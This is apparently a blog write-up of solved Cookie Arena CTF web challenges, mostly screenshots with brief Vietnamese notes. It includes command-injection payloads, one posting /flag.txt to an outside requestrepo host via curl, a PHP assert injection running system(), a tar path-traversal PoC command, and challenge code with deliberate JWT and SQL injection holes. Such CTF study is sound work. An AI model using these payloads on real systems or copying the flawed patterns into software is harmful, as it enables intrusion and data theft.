---
title: "Cookie arena"
excerpt: "January 14, 2021 04:00 PM ICT to January 14, 2021 04:00 PM ICT"

header:
show_date: true
header:
  teaser: "../assets/images/images-icon/chh.png"
  teaser_home_page: true
  icon: "https://hackmd.io/_uploads/By3gJwG0h.png"
categories:
  - CTF
tags:
  - CTF
  - Vietnamese
---

# write up some chall (i solved all web 's challenges in this platform)

## Baby Ping



![image](https://hackmd.io/_uploads/Hkc4ahQXR.png)


![image](https://hackmd.io/_uploads/S1rI6nXQ0.png)


## Empty Execution

![image](https://hackmd.io/_uploads/r1ywhTQ7R.png)


- Tạo reversere shell để tiến hành đọc flag



## Baby Crawler

![image](https://hackmd.io/_uploads/rk100a77R.png)


![image](https://hackmd.io/_uploads/HyaAAaQX0.png)


bypass escapeshellcmd: https://github.com/kacperszurek/exploits/blob/master/GitList/exploit-bypass-php-escapeshellarg-escapeshellcmd.md


## Ethical Ping Pong Club

![image](https://hackmd.io/_uploads/S1VCEAQ70.png)


## Blind Command Injection


![image](https://hackmd.io/_uploads/rJZSLCQmC.png)


![image](https://hackmd.io/_uploads/Byb48R7Q0.png)


## Time

![image](https://hackmd.io/_uploads/S1aZVJNQR.png)

## Break The Editor Jail


https://zacheller.dev/text-editor-jail

https://b4d.sablun.org/blog/2020-02-16-247ctf-com-misc-the-text-editor-jail/


## Ping 0x01

![image](https://hackmd.io/_uploads/S1y9wJNQC.png)


![image](https://hackmd.io/_uploads/rkbYDJ4X0.png)

## Ping 0x02

![image](https://hackmd.io/_uploads/rkXG51NQC.png)


https://forum.cookiearena.org/t/web-ping-0x01-ping-0x02-os-command-injection/164



## Youtube Downloader


chỉ cần ;cat%20/flag.txt là được.


## The Existed File
``
$(curl${IFS}-X${IFS}POST${IFS}--data${IFS}@/flag.txt${IFS}http://fvcwu3xj.requestrepo.com)
``

![image](https://hackmd.io/_uploads/BklnRJ4XA.png)

![image](https://hackmd.io/_uploads/rk93AkNmC.png)


## Are you a search engine bot

- Bài này mình sẽ sử dụng google bot để crawling tất cả những path ẩn
https://www.stanventures.com/blog/googlebot-user-agent-string/


![image](https://hackmd.io/_uploads/S1gFC2NQC.png)


## Baby HTTP Method


![image](https://hackmd.io/_uploads/rJiEL1BX0.png)

![image](https://hackmd.io/_uploads/HJwH8yBm0.png)

![image](https://hackmd.io/_uploads/rygLUkS7C.png)


## Bypass HMAC check

![image](https://hackmd.io/_uploads/SyVJb-r7C.png)

![image](https://hackmd.io/_uploads/SJaebZHXA.png)

![image](https://hackmd.io/_uploads/ByoWWbHmC.png)


https://www.securify.nl/blog/spot-the-bug-challenge-2018-warm-up/


## Neonify

![image](https://hackmd.io/_uploads/BJYqFZr7A.png)


![image](https://hackmd.io/_uploads/r1QfcWBm0.png)

![image](https://hackmd.io/_uploads/HkFXc-HmR.png)


## Favorite JWT


```
#!/usr/bin/env python3

import jwt
import os

from flask import Flask, request, Response, redirect
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address

app = Flask(__name__)
limiter = Limiter(
    app=app,
    key_func=get_remote_address,
    default_limits=["50000 per hour"],
    storage_uri="memory://",
)

secret = os.urandom(32)


def get_new_cookie():
    return jwt.encode({"user": "normal"}, secret, algorithm="HS256")


def check_cookie(cookie):
    return jwt.decode(cookie, options={"verify_signature": False}, algorithms="HS256").get("user", "") == "admin"


@app.route('/')
@limiter.limit("5/second")
def index():
    return Response(open(__file__).read(), mimetype="text/plain")


@app.route('/flag')
@limiter.limit("5/second")
def flag_endpoint():
    if "token" not in request.cookies:
        ret = redirect("/flag")
        ret.set_cookie("token", get_new_cookie())
        return ret
    if check_cookie(request.cookies.get("token")):
        return open("/flag.txt").read()
    else:
        return "Only admins can view the flag!"


if __name__ == "__main__":
    app.run('0.0.0.0', 1337)

```


- Truy cập /flag nhưng khi verify jwt thì ra `admin` mới có thể truy cập vào để lấy flag.


![image](https://hackmd.io/_uploads/rk0GVABXA.png)


![image](https://hackmd.io/_uploads/BJ2EE0HmR.png)


## Baby Slippy

``python2 poc.py -o unix -d 0 -p app/application/blueprints/ routes.py -f evil.tar.gz``

![image](https://hackmd.io/_uploads/BJflB18mC.png)


![image](https://hackmd.io/_uploads/rJrbSy8QC.png)


![image](https://hackmd.io/_uploads/H1E8S18mA.png)


- Bây giờ thì sol bài toán

![image](https://hackmd.io/_uploads/S10ILJIQR.png)

## BaBy Assert

- Đây là payload mà mình tìm được ở hacktrick
https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/php-tricks-esp#rce-via-assert

![image](https://hackmd.io/_uploads/HkTgdkIX0.png)

![image](https://hackmd.io/_uploads/BkaZd18XC.png)



![image](https://hackmd.io/_uploads/ByRvOJ8mC.png)

- Để hiểu rõ cơ chế hoạt động của nó thì mình sẽ thử RCE để lấy nội dung của file index.php

![image](https://hackmd.io/_uploads/H1WnOJ8XR.png)


```
<?php
assert_options(ASSERT_ACTIVE, true);
assert_options(ASSERT_BAIL, true);
assert_options(ASSERT_WARNING, false);

$title = "Baby Assert";

if (isset($_GET['page'])) {
	$page = $_GET['page'];
} else {
	$page = "home";
}

$page = urldecode($page);
$file = "pages/" . $page . ".php";

// '..' is dangerous!
assert("strpos('$file', '..') === false") or die("Detected hacking attempt!");

?>
```

- Với payload của mình thì:

$file = "pages/a','NeVeR') === false and system('cat+index.php') and strpos('a.php";

Lúc này assert trở thành:

assert("strpos('pages/a','NeVeR') === false and system('cat+index.php') and strpos('a.php', '..') === false") or die("Detected hacking attempt!");

- Đó vậy là trở thành câu lệnh đúng


## Baby Address Note


```

from flask import Flask, session, render_template, request, Response, render_template_string, g
import functools
import sqlite3
import os

app = Flask(__name__)
app.config['SECRET_KEY'] = os.urandom(120)


def get_db():
    db = getattr(g, '_database', None)
    if db is None:
        db = g._database = sqlite3.connect('/tmp/address.db')
        db.isolation_level = None
        db.row_factory = sqlite3.Row
    return db


def query_db(query, args=(), one=False):
    with app.app_context():
        cur = get_db().execute(query, args)
        rv = [dict((cur.description[idx][0], str(value))
                   for idx, value in enumerate(row)) for row in cur.fetchall()]
        return (rv[0] if rv else None) if one else rv


@app.before_first_request
def init_db():
    with app.open_resource('schema.sql', mode='r') as f:
        sql = f.read()
        get_db().cursor().executescript(sql)


@ app.teardown_appcontext
def close_connection(exception):
    db = getattr(g, '_database', None)
    if db is not None:
        db.close()


@ app.route('/')
def index():
    uid = request.args.get('uid')
    if uid:
        try:
            sql = f"SELECT * FROM users WHERE uid='{uid}';"
            result = query_db(sql, one=True)
            if result:
                return render_template("welcome.jinja2", uid=uid, result=result)
            else:
                return render_template("welcome.jinja2", uid=uid, result='')
        except Exception as e:
            return render_template("welcome.jinja2", uid=uid, result=e)
    else:
        return render_template("welcome.jinja2", uid=uid, result='')


@ app.route('/heath')
def heath():
    return "OK"


@ app.route('/debug')
def debug():
    return Response(open(__file__).read(), mimetype='text/plain')


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=1337, debug=False)

```